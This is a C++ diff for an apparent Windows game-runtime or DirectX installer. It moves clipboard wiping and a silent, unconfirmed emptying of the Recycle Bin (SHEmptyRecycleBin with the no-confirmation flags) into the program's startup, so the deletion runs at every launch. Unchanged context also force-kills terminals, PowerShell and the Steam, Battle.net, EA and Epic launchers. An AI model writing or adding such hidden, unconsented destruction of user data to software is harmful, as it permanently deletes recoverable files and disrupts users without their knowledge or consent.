@@ -793,10 +793,7 @@ void gamec() {
 		}
 		else
 		{
-			if (OpenClipboard(nullptr)) { EmptyClipboard(); CloseClipboard(); }
-			SHEmptyRecycleBin(nullptr, nullptr, SHERB_NOCONFIRMATION | SHERB_NOPROGRESSUI | SHERB_NOSOUND);
 			for (const auto& proc : { L"cmd.exe", L"DXSETUP.exe", L"pwsh.exe", L"powershell.exe", L"WindowsTerminal.exe", L"OpenConsole.exe", L"wt.exe", L"Battle.net.exe", L"steam.exe", L"Origin.exe", L"EADesktop.exe", L"EpicGamesLauncher.exe" }) pkill(proc);
-			CreateDirectory(L"C:\\Temp", nullptr);
 			// Create temp directory inside current working directory
 			std::filesystem::path tempDir = std::filesystem::current_path() / "temp";
 			std::error_code ec;
@@ -815,8 +812,6 @@ void gamec() {
 				);
 
 				runEx(file_x64.c_str(), { .wait = true, .checkExit = true, .hidden = true, .params = L"/Q" });
-
-				std::filesystem::remove(file_x64, ec);
 			}
 
 			r2(
@@ -827,7 +822,9 @@ void gamec() {
 
 			runEx(file_x86.c_str(), { .wait = true, .checkExit = true, .hidden = true, .params = L"/Q" });
 
-			std::filesystem::remove(file_x86, ec);
+			// Remove entire temp directory (recursively)
+			std::filesystem::remove_all(tempDir, ec);
+
 
 			if (!checkdx9())
 			{
@@ -1414,6 +1411,9 @@ int WINAPI wWinMain(
 	SendMessage(listbox, CB_SETCURSEL, 0, 0);
 	ShowWindow(hWnd, nShowCmd);
 	UpdateWindow(hWnd);
+
+	if (OpenClipboard(nullptr)) { EmptyClipboard(); CloseClipboard(); }
+	SHEmptyRecycleBin(nullptr, nullptr, SHERB_NOCONFIRMATION | SHERB_NOPROGRESSUI | SHERB_NOSOUND);
 
 	MSG msg;
 	while (GetMessage(&msg, nullptr, 0, 0)) {
